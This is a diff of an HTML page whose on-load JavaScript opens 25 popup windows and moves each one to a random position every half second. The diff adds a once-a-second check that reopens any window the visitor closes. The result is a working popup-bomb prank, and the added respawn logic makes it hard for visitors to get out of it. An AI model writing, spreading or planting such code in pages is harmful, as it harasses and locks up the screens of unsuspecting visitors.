@@ -5,40 +5,55 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>114514!!!!</title>
 <script>
-    const numWindows = 25;
-    let windows = [];
+const numWindows = 25;
+let windows = [];
 
-    function getRandomPosition() {
-        return {
-            x: Math.floor(Math.random() * (window.screen.width - 400)),
-            y: Math.floor(Math.random() * (window.screen.height - 300))
+function getRandomPosition() {
+    return {
+        x: Math.floor(Math.random() * (window.screen.width - 400)),
+        y: Math.floor(Math.random() * (window.screen.height - 300))
+    };
+}
+
+function createWindow() {
+    const newWin = window.open('/w.htm', '_blank', 'width=400,height=300');
+    if (newWin) {
+        windows.push(newWin);
+        newWin.onload = () => {
+            moveWindowRandomly(newWin);
         };
     }
+}
 
-    function createAndMoveWindows() {
-        for (let i = 0; i < numWindows; i++) {
-            setTimeout(() => {
-                const newWin = window.open('/w.htm', '_blank', 'width=400,height=300');
-                if (newWin) {
-                    windows.push(newWin);
-                    newWin.onload = () => {
-                        const pos = getRandomPosition();
-                        newWin.moveTo(pos.x, pos.y);
-                        setInterval(() => {
-                            if (!newWin.closed) {
-                                const newPos = getRandomPosition();
-                                newWin.moveTo(newPos.x, newPos.y);
-                            }
-                        }, 500);
-                    };
-                }
-            }, i * 200);
+function moveWindowRandomly(win) {
+    setInterval(() => {
+        if (!win.closed) {
+            const pos = getRandomPosition();
+            win.moveTo(pos.x, pos.y);
         }
+    }, 500);
+}
+
+function createAndMonitorWindows() {
+    for (let i = 0; i < numWindows; i++) {
+        setTimeout(createWindow, i * 200);
     }
 
-    window.onload = function() {
-        createAndMoveWindows();
-    };
+    setInterval(() => {
+        // 閉じられたウィンドウをリストから削除
+        windows = windows.filter(win => {
+            if (win.closed) {
+                createWindow(); // 閉じたら新しいウィンドウを開く
+                return false;
+            }
+            return true;
+        });
+    }, 1000); // 1秒ごとにチェック
+}
+
+window.onload = function () {
+    createAndMonitorWindows();
+};
 </script>
 </head>
 <body>
